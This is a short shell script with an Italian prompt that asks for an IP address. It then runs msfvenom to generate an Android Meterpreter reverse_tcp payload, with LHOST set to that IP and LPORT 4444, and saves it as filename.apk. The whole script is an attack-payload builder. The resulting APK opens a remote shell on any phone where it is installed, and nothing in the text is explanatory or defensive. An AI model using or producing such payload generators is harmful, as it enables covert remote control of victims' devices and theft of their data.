echo "inserire l'ip"

read ip 

msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 R > filename.apk

